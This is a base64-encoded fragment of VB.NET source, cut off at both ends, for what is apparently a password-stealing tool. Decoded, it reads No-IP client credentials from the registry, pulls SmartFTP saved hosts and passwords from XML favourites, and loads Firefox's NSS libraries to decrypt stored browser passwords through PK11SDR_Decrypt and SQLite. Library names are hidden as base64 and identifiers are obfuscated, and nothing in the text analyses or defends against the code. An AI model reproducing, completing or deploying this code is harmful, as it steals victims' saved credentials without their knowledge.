ZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0 DQogICAgICAgIFJlZ1JlYWQgPSB3c2hTaGVsbC5SZWdSZWFkKGhLZXkpDQogICAgRW5kIEZ1bmN0 aW9uDQogICAgUHVibGljIEZ1bmN0aW9uIFJlYWRMaW5lKEJ5VmFsIGZpbGVuYW1lIEFzIFN0cmlu ZywgXw0KICAgIEJ5VmFsIGxpbmUgQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIFRyeQ0K ICAgICAgICAgICAgRGltIGxpbmVzIEFzIFN0cmluZygpID0gTXkuQ29tcHV0ZXIuRmlsZVN5c3Rl bS5SZWFkQWxsVGV4dCggXw0KICAgICAgICAgICAgICBmaWxlbmFtZSwgU3lzdGVtLlRleHQuRW5j b2RpbmcuRGVmYXVsdCkuU3BsaXQodmJDckxmKQ0KICAgICAgICAgICAgSWYgbGluZSA+IDAgVGhl bg0KICAgICAgICAgICAgICAgIFJldHVybiBsaW5lcyhsaW5lIC0gMSkNCiAgICAgICAgICAgIEVs c2VJZiBsaW5lIDwgMCBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVzKGxpbmVzLkxl bmd0aCArIGxpbmUgLSAxKQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIFJldHVy biAiIg0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0K ICAgICAgICAgICAgUmV0dXJuICIiDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgRnVuY3Rpb24N CkVuZCBNb2R1bGUNCg0KTW9kdWxlIE5vX0lQDQogICAgUHVibGljIEZ1bmN0aW9uIGJhc2U2NERl Y29kZShCeVZhbCBkYXRhIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIFRyeQ0KICAgICAg ICAgICAgRGltIGVuY29kZXIgQXMgTmV3IFN5c3RlbS5UZXh0LlVURjhFbmNvZGluZygpDQogICAg ICAgICAgICBEaW0gdXRmOERlY29kZSBBcyBTeXN0ZW0uVGV4dC5EZWNvZGVyID0gZW5jb2Rlci5H ZXREZWNvZGVyKCkNCiAgICAgICAgICAgIERpbSB0b2RlY29kZV9ieXRlIEFzIEJ5dGUoKSA9IENv bnZlcnQuRnJvbUJhc2U2NFN0cmluZyhEYXRhKQ0KICAgICAgICAgICAgRGltIGNoYXJDb3VudCBB cyBJbnRlZ2VyID0gdXRmOERlY29kZS5HZXRDaGFyQ291bnQodG9kZWNvZGVfYnl0ZSwgMCwgdG9k ZWNvZGVfYnl0ZS5MZW5ndGgpDQogICAgICAgICAgICBEaW0gZGVjb2RlZF9jaGFyIEFzIENoYXIo KSA9IE5ldyBDaGFyKGNoYXJDb3VudCAtIDEpIHt9DQogICAgICAgICAgICB1dGY4RGVjb2RlLkdl dENoYXJzKHRvZGVjb2RlX2J5dGUsIDAsIHRvZGVjb2RlX2J5dGUuTGVuZ3RoLCBkZWNvZGVkX2No YXIsIDApDQogICAgICAgICAgICBEaW0gcmVzdWx0IEFzIFN0cmluZyA9IE5ldyBbU3RyaW5nXShk ZWNvZGVkX2NoYXIpDQogICAgICAgICAgICBSZXR1cm4gcmVzdWx0DQogICAgICAgIENhdGNoIGUg QXMgRXhjZXB0aW9uDQogICAgICAgIEVuZCBUcnkNCiAgICAgICAgUmV0dXJuIE5vdGhpbmcNCiAg ICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBJcFJlY29yZCgpIEFzIFN0cmluZw0KICAgICAg ICBUcnkNCiAgICAgICAgICAgIElwUmVjb3JkID0gTm90aGluZw0KICAgICAgICAgICAgRGltIFVz ZXJuYW1lIEFzIFN0cmluZyA9IE15LkNvbXB1dGVyLlJlZ2lzdHJ5LkdldFZhbHVlKCJIS0VZX0xP Q0FMX01BQ0hJTkVcU09GVFdBUkVcVml0YWx3ZXJrc1xEVUMiLCAiVXNlcm5hbWUiLCBOb3RoaW5n KQ0KICAgICAgICAgICAgRGltIFBhc3N3b3JkIEFzIFN0cmluZyA9IE15LkNvbXB1dGVyLlJlZ2lz dHJ5LkdldFZhbHVlKCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcVml0YWx3ZXJrc1xEVUMi LCAiUGFzc3dvcmQiLCBOb3RoaW5nKQ0KICAgICAgICAgICAgRGltIG5sIEFzIFN0cmluZyA9IHZi TmV3TGluZQ0KDQogICAgICAgICAgICBJZiBVc2VybmFtZSA8PiAiIiBUaGVuDQogICAgICAgICAg ICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhd LkFwcGVuZFRleHQoIn5+fn5+Tm8tSVB+fn5+fiIpDQogICAgICAgICAgICAgICAgWzI0XS5bODhd LkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlVz ZXJuYW1lOiAiICYgVXNlcm5hbWUpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRl eHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAi ICYgYmFzZTY0RGVjb2RlKFBhc3N3b3JkKSkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBw ZW5kVGV4dChubCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+ fn5+fiIpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAg ICAgICBFbmQgSWYNCiAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQoNCiAgICAgICAgRW5k IFRyeQ0KDQogICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgRW5kIEZ1bmN0aW9uDQoNCkVuZCBN b2R1bGUNCk1vZHVsZSBTbWFydEZUUA0KICAgIEZ1bmN0aW9uIFNtYXJ0RlRQKCkgQXMgU3RyaW5n DQogICAgICAgIERpbSBzUGF0aCBBcyBTdHJpbmcgPSBFbnZpcm9uJCgiQVBQREFUQSIpICYgIlxT bWFydEZUUFxDbGllbnQgMi4wXEZhdm9yaXRlc1xRdWljayBDb25uZWN0XCIgJiBEaXIoRW52aXJv biQoIkFQUERBVEEiKSAmICJcU21hcnRGVFBcQ2xpZW50IDIuMFxGYXZvcml0ZXNcUXVpY2sgQ29u bmVjdFwqLnhtbCIpDQogICAgICAgIERpbSBzRmlsZSBBcyBTdHJpbmcgPSBSZWFkRmlsZShzUGF0 aCkNCiAgICAgICAgRGltIHNIb3N0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjxIb3N0PiIsICI8 L0hvc3Q+IikNCiAgICAgICAgRGltIHNQb3J0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjxQb3J0 PiIsICI8L1BvcnQ+IikNCiAgICAgICAgRGltIHNVc2VyIEFzIFN0cmluZyA9IEN1dChzRmlsZSwg IjxVc2VyPiIsICI8L1VzZXI+IikNCiAgICAgICAgRGltIHNQd2QgQXMgU3RyaW5nID0gQ3V0KHNG aWxlLCAiPFBhc3N3b3JkPiIsICI8L1Bhc3N3b3JkPiIpDQogICAgICAgIERpbSBzRW50cnkgQXMg U3RyaW5nID0gQ3V0KHNGaWxlLCAiPE5hbWU+IiwgIjwvTmFtZT4iKQ0KDQogICAgICAgIElmIE5v dCBzVXNlciA9ICIiIFRoZW4NCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIFNtYXJ0 RlRQID0gIkVudHJ5OiAiICsgc0VudHJ5ICsgdmJOZXdMaW5lICsgIkhvc3Q6ICIgKyBzSG9zdCAr ICI6IiArIHNQb3J0ICsgdmJOZXdMaW5lICsgIlVzZXI6ICIgKyBzVXNlciArIHZiTmV3TGluZSAr ICJQYXNzd29yZDogIiArIHNQd2QgKyAiIChFbmNyeXB0KSINCiAgICAgICAgICAgICAgICBEaW0g bmwgQXMgU3RyaW5nID0gdmJOZXdMaW5lDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVu ZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+U21h cnRGVFB+fn5+fiIpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQog ICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIkVudHJ5OiAiICYgc0VudHJ5KQ0K ICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAg IFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJIb3N0OiAiICYgc0hvc3QpDQogICAgICAgICAgICAgICAg WzI0XS5bODhdLkFwcGVuZFRleHQoIjogIiAmIHNQb3J0KQ0KICAgICAgICAgICAgICAgIFsyNF0u Wzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0 KCJVc2VyOiAiICYgc1VzZXIpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQo bmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAiICYg c1B3ZCkNCiAgICAgICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+fn5+fiIp DQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBD YXRjaCBleCBBcyBFeGNlcHRpb24NCg0KICAgICAgICAgICAgRW5kIFRyeQ0KICAgICAgICBFbHNl DQogICAgICAgIEVuZCBJZg0KICAgICAgICBSZXR1cm4gTm90aGluZw0KICAgIEVuZCBGdW5jdGlv bg0KICAgIEZ1bmN0aW9uIFJlYWRGaWxlKEJ5VmFsIHNGaWxlIEFzIFN0cmluZykgQXMgU3RyaW5n DQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIERpbSBPcGVuRmlsZSBBcyBO ZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihzRmlsZSkNCiAgICAgICAgUmVhZEZpbGUgPSBPcGVu RmlsZS5SZWFkVG9FbmQuVG9TdHJpbmcNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBD dXQoQnlWYWwgc0luaGFsdCBBcyBTdHJpbmcsIEJ5VmFsIHNUZXh0IEFzIFN0cmluZywgQnlWYWwg c3RleHQyIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0 DQogICAgICAgIERpbSBjKCkgQXMgU3RyaW5nDQogICAgICAgIERpbSBjMigpIEFzIFN0cmluZw0K ICAgICAgICBjID0gU3BsaXQoc0luaGFsdCwgc1RleHQpDQogICAgICAgIGMyID0gU3BsaXQoYygx KSwgc3RleHQyKQ0KICAgICAgICBDdXQgPSBjMigwKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1 bmN0aW9uIFJlZ1JlYWQoQnlWYWwgaEtleSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBE aW0gd3NoU2hlbGwgQXMgT2JqZWN0ID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCiAg ICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAgICAgUmVnUmVhZCA9IHdzaFNoZWxsLlJl Z1JlYWQoaEtleSkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgRnVuY3Rpb24gUmVhZExp bmUoQnlWYWwgZmlsZW5hbWUgQXMgU3RyaW5nLCBfDQogICAgQnlWYWwgbGluZSBBcyBJbnRlZ2Vy KSBBcyBTdHJpbmcNCiAgICAgICAgVHJ5DQogICAgICAgICAgICBEaW0gbGluZXMgQXMgU3RyaW5n KCkgPSBNeS5Db21wdXRlci5GaWxlU3lzdGVtLlJlYWRBbGxUZXh0KCBfDQogICAgICAgICAgICAg IGZpbGVuYW1lLCBTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0KS5TcGxpdCh2YkNyTGYpDQog ICAgICAgICAgICBJZiBsaW5lID4gMCBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVz KGxpbmUgLSAxKQ0KICAgICAgICAgICAgRWxzZUlmIGxpbmUgPCAwIFRoZW4NCiAgICAgICAgICAg ICAgICBSZXR1cm4gbGluZXMobGluZXMuTGVuZ3RoICsgbGluZSAtIDEpDQogICAgICAgICAgICBF bHNlDQogICAgICAgICAgICAgICAgUmV0dXJuICIiDQogICAgICAgICAgICBFbmQgSWYNCiAgICAg ICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQogICAgICAgICAgICBSZXR1cm4gIiINCiAgICAgICAg RW5kIFRyeQ0KICAgIEVuZCBGdW5jdGlvbg0KRW5kIE1vZHVsZQ0KDQpNb2R1bGUgSUVGVQ0KICAg IFB1YmxpYyBDbGFzcyBTSElURU1JRA0KICAgICAgICBQdWJsaWMgU2hhcmVkIGNiIEFzIExvbmcN CiAgICAgICAgUHVibGljIFNoYXJlZCBhYklEIEFzIEJ5dGUoKQ0KICAgIEVuZCBDbGFzcw0KICAg IDxTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKT4gXw0KICAgIFB1YmxpYyBTdHJ1 Y3R1cmUgVFNFQ0l0ZW0NCiAgICAgICAgUHVibGljIFNFQ0l0ZW1UeXBlIEFzIEludGVnZXINCiAg ICAgICAgUHVibGljIFNFQ0l0ZW1EYXRhIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIFNFQ0l0 ZW1MZW4gQXMgSW50ZWdlcg0KICAgIEVuZCBTdHJ1Y3R1cmUNCg0KICAgIDxEbGxJbXBvcnQoImtl cm5lbDMyLmRsbCIpPiBfDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBMb2FkTGlicmFyeShCeVZhbCBk bGxGaWxlUGF0aCBBcyBTdHJpbmcpIEFzIEludFB0cg0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFBy aXZhdGUgTlNTMyBBcyBJbnRQdHINCiAgICA8RGxsSW1wb3J0KCJrZXJuZWwzMiIsIENoYXJTZXQ6 PUNoYXJTZXQuQW5zaSwgRXhhY3RTcGVsbGluZzo9VHJ1ZSwgU2V0TGFzdEVycm9yOj1UcnVlKT4g Xw0KICAgIFByaXZhdGUgRnVuY3Rpb24gR2V0UHJvY0FkZHJlc3MoQnlWYWwgaE1vZHVsZSBBcyBJ bnRQdHIsIEJ5VmFsIHByb2NOYW1lIEFzIFN0cmluZykgQXMgSW50UHRyDQogICAgRW5kIEZ1bmN0 aW9uDQogICAgPFVubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVj bCk+IF8NCiAgICBQdWJsaWMgRGVsZWdhdGUgRnVuY3Rpb24gRExMRnVuY3Rpb25EZWxlZ2F0ZShC eVZhbCBjb25maWdkaXIgQXMgU3RyaW5nKSBBcyBMb25nDQogICAgUHVibGljIEZ1bmN0aW9uIE5T U19Jbml0KEJ5VmFsIGNvbmZpZ2RpciBBcyBTdHJpbmcpIEFzIExvbmcNCiAgICAgICAgRGltIFsx MDhdIEFzIFN0cmluZyA9IEVudmlyb25tZW50LkdldEVudmlyb25tZW50VmFyaWFibGUoIlBST0dS QU1GSUxFUyIpICYgIlwiICYgWzI0XS5bNDJdKCJUVzk2YVd4c1lRPT0iKSAmICIgIiAmIFsyNF0u WzQyXSgiUm1seVpXWnZlQT09IikgJiAiXCINCiAgICAgICAgTG9hZExpYnJhcnkoWzEwOF0gJiBb MjRdLls0Ml0oImJXOTZZM0owTVRrdVpHeHMiKSkNCiAgICAgICAgTG9hZExpYnJhcnkoWzEwOF0g JiBbMjRdLls0Ml0oImJuTndjalF1Wkd4cyIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAm IFsyNF0uWzQyXSgiY0d4ak5DNWtiR3c9IikpDQogICAgICAgIExvYWRMaWJyYXJ5KFsxMDhdICYg WzI0XS5bNDJdKCJjR3hrY3pRdVpHeHMiKSkNCiAgICAgICAgTG9hZExpYnJhcnkoWzEwOF0gJiBb MjRdLls0Ml0oImMzTjFkR2xzTXk1a2JHdz0iKSkNCiAgICAgICAgTG9hZExpYnJhcnkoWzEwOF0g JiBbMjRdLls0Ml0oImMzRnNhWFJsTXk1a2JHdz0iKSkNCiAgICAgICAgTG9hZExpYnJhcnkoWzEw OF0gJiBbMjRdLls0Ml0oImJuTnpkWFJwYkRNdVpHeHMiKSkNCiAgICAgICAgTG9hZExpYnJhcnko WzEwOF0gJiBbMjRdLls0Ml0oImMyOW1kRzlyYmpNdVpHeHMiKSkNCiAgICAgICAgTlNTMyA9IExv YWRMaWJyYXJ5KFsxMDhdICYgWzI0XS5bNDJdKCJibk56TXk1a2JHdz0iKSkNCiAgICAgICAgRGlt IHBQcm9jIEFzIEludFB0ciA9IEdldFByb2NBZGRyZXNzKE5TUzMsICJOU1NfSW5pdCIpDQogICAg ICAgIERpbSBkbGwgQXMgRExMRnVuY3Rpb25EZWxlZ2F0ZSA9IERpcmVjdENhc3QoTWFyc2hhbC5H ZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgR2V0VHlwZShETExGdW5jdGlvbkRl bGVnYXRlKSksIERMTEZ1bmN0aW9uRGVsZWdhdGUpDQogICAgICAgIFJldHVybiBkbGwoY29uZmln ZGlyKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIDxVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2Fs bGluZ0NvbnZlbnRpb24uQ2RlY2wpPiBfDQogICAgUHVibGljIERlbGVnYXRlIEZ1bmN0aW9uIERM TEZ1bmN0aW9uRGVsZWdhdGUyKCkgQXMgTG9uZw0KICAgIFB1YmxpYyBGdW5jdGlvbiBQSzExX0dl dEludGVybmFsS2V5U2xvdCgpIEFzIExvbmcNCiAgICAgICAgRGltIHBQcm9jIEFzIEludFB0ciA9 IEdldFByb2NBZGRyZXNzKE5TUzMsICJQSzExX0dldEludGVybmFsS2V5U2xvdCIpDQogICAgICAg IERpbSBkbGwgQXMgRExMRnVuY3Rpb25EZWxlZ2F0ZTIgPSBEaXJlY3RDYXN0KE1hcnNoYWwuR2V0 RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIocFByb2MsIEdldFR5cGUoRExMRnVuY3Rpb25EZWxl Z2F0ZTIpKSwgRExMRnVuY3Rpb25EZWxlZ2F0ZTIpDQogICAgICAgIFJldHVybiBkbGwoKQ0KICAg IEVuZCBGdW5jdGlvbg0KICAgIDxVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZl bnRpb24uQ2RlY2wpPiBfDQogICAgUHVibGljIERlbGVnYXRlIEZ1bmN0aW9uIERMTEZ1bmN0aW9u RGVsZWdhdGUzKEJ5VmFsIHNsb3QgQXMgTG9uZywgQnlWYWwgbG9hZENlcnRzIEFzIEJvb2xlYW4s IEJ5VmFsIHdpbmN4IEFzIExvbmcpIEFzIExvbmcNCiAgICBQdWJsaWMgRnVuY3Rpb24gUEsxMV9B dXRoZW50aWNhdGUoQnlWYWwgc2xvdCBBcyBMb25nLCBCeVZhbCBsb2FkQ2VydHMgQXMgQm9vbGVh biwgQnlWYWwgd2luY3ggQXMgTG9uZykgQXMgTG9uZw0KICAgICAgICBEaW0gcFByb2MgQXMgSW50 UHRyID0gR2V0UHJvY0FkZHJlc3MoTlNTMywgIlBLMTFfQXV0aGVudGljYXRlIikNCiAgICAgICAg RGltIGRsbCBBcyBETExGdW5jdGlvbkRlbGVnYXRlMyA9IERpcmVjdENhc3QoTWFyc2hhbC5HZXRE ZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgR2V0VHlwZShETExGdW5jdGlvbkRlbGVn YXRlMykpLCBETExGdW5jdGlvbkRlbGVnYXRlMykNCiAgICAgICAgUmV0dXJuIGRsbChzbG90LCBs b2FkQ2VydHMsIHdpbmN4KQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIDxVbm1hbmFnZWRGdW5jdGlv blBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpPiBfDQogICAgUHVibGljIERlbGVnYXRl IEZ1bmN0aW9uIERMTEZ1bmN0aW9uRGVsZWdhdGU0KEJ5VmFsIGFyZW5hT3B0IEFzIEludFB0ciwg QnlWYWwgb3V0SXRlbU9wdCBBcyBJbnRQdHIsIEJ5VmFsIGluU3RyIEFzIFN0cmluZ0J1aWxkZXIs IEJ5VmFsIGluTGVuIEFzIEludGVnZXIpIEFzIEludGVnZXINCiAgICBQdWJsaWMgRnVuY3Rpb24g TlNTQmFzZTY0X0RlY29kZUJ1ZmZlcihCeVZhbCBhcmVuYU9wdCBBcyBJbnRQdHIsIEJ5VmFsIG91 dEl0ZW1PcHQgQXMgSW50UHRyLCBCeVZhbCBpblN0ciBBcyBTdHJpbmdCdWlsZGVyLCBCeVZhbCBp bkxlbiBBcyBJbnRlZ2VyKSBBcyBJbnRlZ2VyDQogICAgICAgIERpbSBwUHJvYyBBcyBJbnRQdHIg PSBHZXRQcm9jQWRkcmVzcyhOU1MzLCAiTlNTQmFzZTY0X0RlY29kZUJ1ZmZlciIpDQogICAgICAg IERpbSBkbGwgQXMgRExMRnVuY3Rpb25EZWxlZ2F0ZTQgPSBEaXJlY3RDYXN0KE1hcnNoYWwuR2V0 RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIocFByb2MsIEdldFR5cGUoRExMRnVuY3Rpb25EZWxl Z2F0ZTQpKSwgRExMRnVuY3Rpb25EZWxlZ2F0ZTQpDQogICAgICAgIFJldHVybiBkbGwoYXJlbmFP cHQsIG91dEl0ZW1PcHQsIGluU3RyLCBpbkxlbikNCiAgICBFbmQgRnVuY3Rpb24NCiAgICA8VW5t YW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKT4gXw0KICAgIFB1 YmxpYyBEZWxlZ2F0ZSBGdW5jdGlvbiBETExGdW5jdGlvbkRlbGVnYXRlNShCeVJlZiBkYXRhIEFz IFRTRUNJdGVtLCBCeVJlZiByZXN1bHQgQXMgVFNFQ0l0ZW0sIEJ5VmFsIGN4IEFzIEludGVnZXIp IEFzIEludGVnZXINCiAgICBQdWJsaWMgRnVuY3Rpb24gUEsxMVNEUl9EZWNyeXB0KEJ5UmVmIGRh dGEgQXMgVFNFQ0l0ZW0sIEJ5UmVmIHJlc3VsdCBBcyBUU0VDSXRlbSwgQnlWYWwgY3ggQXMgSW50 ZWdlcikgQXMgSW50ZWdlcg0KICAgICAgICBEaW0gcFByb2MgQXMgSW50UHRyID0gR2V0UHJvY0Fk ZHJlc3MoTlNTMywgIlBLMTFTRFJfRGVjcnlwdCIpDQogICAgICAgIERpbSBkbGwgQXMgRExMRnVu Y3Rpb25EZWxlZ2F0ZTUgPSBEaXJlY3RDYXN0KE1hcnNoYWwuR2V0RGVsZWdhdGVGb3JGdW5jdGlv blBvaW50ZXIocFByb2MsIEdldFR5cGUoRExMRnVuY3Rpb25EZWxlZ2F0ZTUpKSwgRExMRnVuY3Rp b25EZWxlZ2F0ZTUpDQogICAgICAgIFJldHVybiBkbGwoZGF0YSwgcmVzdWx0LCBjeCkNCiAgICBF bmQgRnVuY3Rpb24NCiAgICBQdWJsaWMgc2lnbm9uIEFzIFN0cmluZw0KICAgIFB1YmxpYyBDbGFz cyBTUUxpdGVCYXNlDQoJDQogICAgICAgIDxEbGxJbXBvcnQoImtlcm5lbDMyIik+IF8NCiAgICAg ICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gSGVhcEFsbG9jKEJ5VmFsIGhlYXAgQXMgSW50UHRy LCBCeVZhbCBmbGFncyBBcyBVSW50MzIsIEJ5VmFsIGJ5dGVzIEFzIFVJbnQzMikgQXMgSW50UHRy DQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoImtlcm5lbDMyIik+ IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gR2V0UHJvY2Vzc0hlYXAoKSBBcyBJ bnRQdHINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgia2VybmVs MzIiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBsc3RybGVuKEJ5VmFsIHN0 ciBBcyBJbnRQdHIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgICAgIDxE bGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBz cWxpdGUzX29wZW4oQnlWYWwgZmlsZU5hbWUgQXMgSW50UHRyLCBCeVJlZiBkYXRhYmFzZSBBcyBJ bnRQdHIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbElt cG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0 ZTNfY2xvc2UoQnlWYWwgZGF0YWJhc2UgQXMgSW50UHRyKSBBcyBJbnRlZ2VyDQogICAgICAgIEVu ZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQ cml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2V4ZWMoQnlWYWwgZGF0YWJhc2UgQXMgSW50 UHRyLCBCeVZhbCBxdWVyeSBBcyBJbnRQdHIsIEJ5VmFsIGNhbGxiYWNrIEFzIEludFB0ciwgQnlW YWwgYXJndW1lbnRzIEFzIEludFB0ciwgQnlSZWYgW2Vycm9yXSBBcyBJbnRQdHIpIEFzIEludGVn ZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIp PiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfZXJybXNnKEJ5VmFs IGRhdGFiYXNlIEFzIEludFB0cikgQXMgSW50UHRyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQog ICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBG dW5jdGlvbiBzcWxpdGUzX3ByZXBhcmVfdjIoQnlWYWwgZGF0YWJhc2UgQXMgSW50UHRyLCBCeVZh bCBxdWVyeSBBcyBJbnRQdHIsIEJ5VmFsIGxlbmd0aCBBcyBJbnRlZ2VyLCBCeVJlZiBzdGF0ZW1l bnQgQXMgSW50UHRyLCBCeVJlZiB0YWlsIEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBF bmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAg UHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19zdGVwKEJ5VmFsIHN0YXRlbWVudCBBcyBJ bnRQdHIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbElt cG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0 ZTNfY29sdW1uX2NvdW50KEJ5VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIpIEFzIEludGVnZXINCiAg ICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQog ICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfY29sdW1uX25hbWUoQnlWYWwg c3RhdGVtZW50IEFzIEludFB0ciwgQnlWYWwgY29sdW1uTnVtYmVyIEFzIEludGVnZXIpIEFzIElu dFB0cg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUz Iik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19jb2x1bW5fdHlw ZShCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVZhbCBjb2x1bW5OdW1iZXIgQXMgSW50ZWdl cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0 KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19j b2x1bW5faW50KEJ5VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5VmFsIGNvbHVtbk51bWJlciBB cyBJbnRlZ2VyKSBBcyBJbnRlZ2VyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxE bGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBz 